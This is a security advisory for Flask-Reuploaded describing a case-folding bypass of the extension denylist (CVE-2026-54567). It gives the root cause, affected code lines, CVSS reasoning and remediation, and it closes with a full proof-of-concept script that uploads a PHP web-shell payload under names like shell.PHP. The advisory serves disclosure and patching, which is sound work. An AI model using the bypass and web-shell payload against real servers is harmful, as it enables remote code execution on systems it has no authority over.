# [H] Flask-Reuploaded: Extension-denylist bypass via case-folding asymmetry in name-override path (incomplete-fix variant of CVE-2026-27641)

## Summary
Severity: High
Advisory: GHSA-937x-gpqr-72gg
CVE: CVE-2026-54567
CWE: CWE-178, CWE-434
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-17
Source: https://github.com/advisories/GHSA-937x-gpqr-72gg
Type: github-advisory

## Affected
- PyPI: `Flask-Reuploaded` — affected >=0 <1.6.0

## Details
## 1. Header

| Field | Value |
|---|---|
| **Title** | Extension-denylist bypass via case-folding asymmetry in name-override path (incomplete-fix variant of CVE-2026-27641) |
| **Project** | Flask-Reuploaded (`flask_uploads`) |
| **Affected** | `<= 1.5.0` (latest release; commit `ae31c3f91da40b465ca5e8f57d93f063b4553e23`) |
| **Relationship** | Incomplete-fix variant of **CVE-2026-27641** (fixed in v1.5.0; this variant survives that fix) |
| **CWE** | CWE-434 (Unrestricted Upload of File with Dangerous Type) + CWE-178 (Improper Handling of Case Sensitivity) |
| **CVSS v3.1 (proposed)** | **~7.0–7.3 (High, conditional)** — `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H`. Final score deferred to maintainer. |
| **Verified against** | `pip install Flask-Reuploaded==1.5.0`, Python 3.11 |

---

## 2. Decisive evidence — the asymmetry

The v1.5.0 fix for CVE-2026-27641 added an extension **re-validation** that runs when a caller supplies a `name` override to `UploadSet.save()`. It is routed through the **case-preserving** `extension()` helper, whereas the default upload path normalizes to lowercase via `lowercase_ext()` (inside `get_basename()`). The two paths disagree on case:

```
default path     : get_basename("shell.PHP")
                   = lowercase_ext(secure_filename("shell.PHP")) = "shell.php"
                   -> extension("shell.php") = "php"
                   -> extension_allowed("php")  -> DENY      (correct)

name-override    : secure_filename("shell.PHP") = "shell.PHP"   (case preserved)
                   -> basename = "shell.PHP"
                   -> ext = extension("shell.PHP") = "PHP"        (NOT lowercased)
                   -> extension_allowed("PHP")  -> ALLOW         (bypass)
```

On a denylist `UploadSet` the allow-check returns `True` for the mixed-case form:

```python
# extensions.py:97
def __contains__(self, item): return item not in self.items
# "PHP" not in ('js','php','pl','py','rb','sh')  ->  True   ->  allowed
```

`extension_allowed("PHP")` passes the denylist that `extension_allowed("php")` is blocked by.

---

## 3. Vulnerability summary

`UploadSet.save(storage, name=...)` lets the caller override the stored filename. After the CVE-2026-27641 fix, `name` is sanitized with `secure_filename()` and its extension re-validated. Because the re-validation compares a **case-preserving** extension against a policy whose denied tokens are lowercase, an attacker controlling `name` stores a file with a denied extension by varying case (`shell.PHP`, `evil.pHp`). On servers that resolve/execute extensions case-insensitively (Windows/macOS filesystems; Apache `AddHandler`/`AddType`), this re-enables the dangerous-upload → code-execution outcome the parent CVE addressed. The bypassed config is the one the library's own docs recommend for blocking scripts (see §6).

---

## 4. Affected components

Permalinks pinned to commit `ae31c3f91da40b465ca5e8f57d93f063b4553e23` (v1.5.0).

| Role | Location |
|---|---|
| Normalizing helper (default path) | `src/flask_uploads/flask_uploads.py:283` — `return lowercase_ext(secure_filename(filename))` |
| `save()` entry | `src/flask_uploads/flask_uploads.py:285` |
| name-override sanitize | `src/flask_uploads/flask_uploads.py:333` — `name = secure_filename(name)` |
| name-override assign (case kept) | `src/flask_uploads/flask_uploads.py:341` — `basename = name` |
| **Re-validation (non-normalizing)** | `src/flask_uploads/flask_uploads.py:344` — `ext = extension(basename)` |
| Allow-check | `src/flask_uploads/flask_uploads.py:345` |
| Policy check | `src/flask_uploads/flask_uploads.py:268` — `extension_allowed` |
| Containment backstop (path only) | `src/flask_uploads/flask_uploads.py:364` |
| Sink | `src/flask_uploads/flask_uploads.py:374` — `storage.save(target)` |
| Case-preserving extractor | `src/flask_uploads/extensions.py:101` — `def extension` |
| Case-normalizing extractor | `src/flask_uploads/extensions.py:109` — `def lowercase_ext` |
| Denylist membership | `src/flask_uploads/extensions.py:97` — `AllExcept.__contains__` |
| Documented script denylist | `src/flask_uploads/extensions.py:34-35` |

---

## 5. Taint analysis

- **Source:** the `name` argument of `UploadSet.save(storage, name=...)` — commonly user-derived; the parent CVE-2026-27641 already treats `name` as attacker-controllable.
- **Guard (asymmetric):** `secure_filename(name)` stops traversal, but the extension policy check at `:344-345` uses non-normalizing `extension()` against a lowercase-tokened policy. The realpath containment at `:364` constrains the *path*, not the *extension* — orthogonal to this bypass.
- **Sink:** `storage.save(target)` at `:374` writes the attacker-extensioned file into the served upload directory.

---

## 6. CVSS justification (preconditions stated honestly)

`CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H` ≈ **7.0–7.3 (High)**.

- **AV:N** — web upload endpoint.
- **AC:H** — three preconditions (stated plainly):
  1. `UploadSet` uses a **denylist** — `AllExcept(...)` or populated `config.deny`. (Allowlists fail closed — §7c.)
  2. Application passes a **user-influenced `name`** to `save()`.
  3. Deployment resolves/executes extensions **case-insensitively** (Windows/macOS FS; Apache `AddHandler`/`AddType`).
- **PR:L** — uploads typically authenticated. **UI:N**. **S:U**. **C:H/I:H/A:H** — RCE under the web server's privileges on execution-capable upload dirs.

**Why High, not a contrived misconfiguration** — the bypassed control is the library's documented script-blocking mechanism:

- `extensions.py:34-35` — `SCRIPTS`: *"…you might want to add ``php`` to the DENY setting."*
- `extensions.py:24-26` — `EXECUTABLES`: *"…it's better suited for use with `AllExcept`."*

An app that followed this guidance to block scripts is exactly what this variant defeats.

**Not claimed:** not Critical. Pure allowlists are unaffected; execution requires a case-insensitive surface. Final score deferred to the maintainer.

---

## 7. Proof of Concept (results)

Against shipped `Flask-Reuploaded==1.5.0`:

### 7a. Asymmetry
```
default path  : lowercase_ext("shell.PHP") -> "php" -> extension_allowed("php") -> DENY
name-override : secure_filename("shell.PHP") -> "shell.PHP" -> extension(...) -> "PHP" -> extension_allowed("PHP") -> ALLOW
```

### 7b. End-to-end (denylist `AllExcept(SCRIPTS)`)
```
[1] save(storage("shell.PHP"))                              -> UploadNotAllowed   (default path blocked)
[2] save(storage("upload.bin"), name="shell.PHP")           -> saved "shell.PHP", on_disk=True   (BYPASS)
[2b] save(storage("upload.bin"), name="evil.pHp")           -> saved "evil.pHp",  on_disk=True; containment intact
```

### 7c. Negative controls
```
[3] allowlist IMAGES, name="shell.PHP"  -> UploadNotAllowed: File extension 'PHP' is not allowed  (fail-closed)
[4] allowlist IMAGES, name="photo.jpg"  -> saved "photo.jpg"                                       (legit unaffected)
```

---

## 8. Patch pattern (internal precedent)

The project ships a **case-normalizing** extractor (`lowercase_ext`, used by `get_basename`) specifically so configured extensions are *"compare[d] … in the same case"* (its docstring). The v1.5.0 re-validation instead calls the **case-preserving** `extension()`, so the new guard does not match the normalization the rest of the system relies on — the classic incomplete-fix shape where a hand-rolled check diverges from the canonical normalizer.

---

## 9. Impact

- Bypass of the documented extension denylist for scripts/executables.
- Storage of `.PHP` / `.pHp` / mixed-case dangerous files inside the served upload directory (path containment holds; extension policy defeated).
- On case-insensitive execution surfaces → **remote code execution** under the web server's privileges — the parent CVE's end impact, re-enabled on denylist deployments.

---

## 10. Suggested remediation

Normalize before the policy check so the name-override path matches the default path:

1. `ext = extension(basename).lower()` (or `extension(lowercase_ext(basename))`) before `extension_allowed`.
2. Or run the overridden `basename` through `lowercase_ext()` (as `get_basename` does) before both validation and save.
3. Or make `extension_allowed` / the policy containers case-insensitive.

Option (1) or (2) is the minimal, behavior-preserving fix.

---

## 11. Evidence files

- `poc_case_fold.py` (§12) — self-contained PoC; runs against `pip install Flask-Reuploaded==1.5.0`.
- `/tmp/flask_reuploaded_case_fold_proof.txt` — captured verdict.
- Source permalinks pinned to commit `ae31c3f91da40b465ca5e8f57d93f063b4553e23`.

---

## 12. Full PoC script (`poc_case_fold.py`)

```python
"""
PoC — Flask-Reuploaded CVE-2026-27641 incomplete-fix variant
Case-folding asymmetry in the name-override extension re-validation.

Parent fix (v1.5.0) added an extension re-validation in UploadSet.save() when a
`name` override is supplied, but routed it through the CASE-PRESERVING
`extension()` helper instead of the CASE-NORMALIZING `lowercase_ext()` used by the
default upload path (get_basename -> lowercase_ext). On a denylist-style UploadSet
(AllExcept / config.deny), an uppercase/mixed-case extension therefore bypasses the
denylist that the default path correctly blocks.

  default path     : lowercase_ext("shell.PHP") -> "php" -> extension_allowed("php") -> DENY
  name-override    : secure_filename("shell.PHP") -> "shell.PHP" (case kept)
                     -> extension("shell.PHP")  -> "PHP" -> extension_allowed("PHP") -> ALLOW

Tested against the SHIPPED, patched Flask-Reuploaded==1.5.0.
"""
import io
import os
import shutil
import tempfile

from flask import Flask
from flask_uploads import (
    UploadSet, AllExcept, SCRIPTS, IMAGES, configure_uploads, UploadNotAllowed,
)
from werkzeug.datastructures import FileStorage
import flask_uploads


def make_storage(filename: str) -> FileStorage:
    return FileStorage(
        stream=io.BytesIO(b"<?php system($_GET['c']); ?>"),
        filename=filename,
        content_type="application/octet-stream",
    )


def run():
    import importlib.metadata as md
    print(f"[*] pip reports: Flask-Reuploaded=={md.version('Flask-Reuploaded')}")

    dest_denylist = tempfile.mkdtemp(prefix="fr_deny_")
    dest_allowlist = tempfile.mkdtemp(prefix="fr_allow_")

    app = Flask(__name__)
    files_deny = UploadSet("filesdeny", AllExcept(SCRIPTS))   # documented "allow all except scripts"
    files_allow = UploadSet("filesallow", IMAGES)             # allowlist (fail-closed)
    app.config["UPLOADED_FILESDENY_DEST"] = dest_denylist
    app.config["UPLOADED_FILESALLOW_DEST"] = dest_allowlist
    configure_uploads(app, (files_deny, files_allow))

    results = {}
    with app.app_context():
        # [1] default path, denylist -> must DENY
        try:
            saved = files_deny.save(make_storage("shell.PHP"))
            results["default_path"] = f"SAVED as {saved}  <-- UNEXPECTED"
        except UploadNotAllowed:
            results["default_path"] = "DENIED (expected)"

        # [2] name-override, denylist -> BYPASS
        try:
            saved = files_deny.save(make_storage("upload.bin"), name="shell.PHP")
            on_disk = os.path.join(dest_denylist, saved)
            results["variant"] = f"BYPASS — saved as {saved}, on_disk={os.path.exists(on_disk)}"
        except UploadNotAllowed:
            results["variant"] = "DENIED (variant did NOT reproduce)"

        # [2b] mixed-case generality + containment intact
        try:
            saved = files_deny.save(make_storage("upload.bin"), name="evil.pHp")
            on_disk = os.path.join(dest_denylist, saved)
            inside = os.path.realpath(on_disk).startswith(os.path.realpath(dest_denylist))
            results["variant_mixed"] = f"BYPASS — saved as {saved}, inside_dest={inside}"
        except UploadNotAllowed:
            results["variant_mixed"] = "DENIED"

        # [3] allowlist -> fail closed
        try:
            saved = files_allow.save(make_storage("real.jpg"), name="shell.PHP")
            results["allowlist"] = f"SAVED as {saved}  <-- allowlist leaked"
        except UploadNotAllowed:
            results["allowlist"] = "DENIED (expected — allowlist fails closed)"

        # [4] legit upload -> allowed
        try:
            saved = files_allow.save(make_storage("real.jpg"), name="photo.jpg")
            results["legit"] = f"SAVED as {saved} (expected)"
        except UploadNotAllowed:
            results["legit"] = "DENIED (UNEXPECTED — legit upload broke)"

    print("VERDICT:")
    for k, v in results.items():
        print(f"   {k:14s}: {v}")

    confirmed = (
        "BYPASS" in results.get("variant", "")
        and results.get("default_path") == "DENIED (expected)"
        and "DENIED" in results.get("allowlist", "")
    )
    print("FLASK_REUPLOADED_CASE_FOLD_CONFIRMED" if confirmed else "VARIANT NOT CONFIRMED — honest cut")

    shutil.rmtree(dest_denylist, ignore_errors=True)
    shutil.rmtree(dest_allowlist, ignore_errors=True)


if __name__ == "__main__":
    run()
```

## References
- https://github.com/jugmac00/flask-reuploaded/security/advisories/GHSA-937x-gpqr-72gg
- https://github.com/jugmac00/flask-reuploaded/commit/5ded76092429c6eb8a4af941b14fbde40a38fff4
- https://github.com/jugmac00/flask-reuploaded
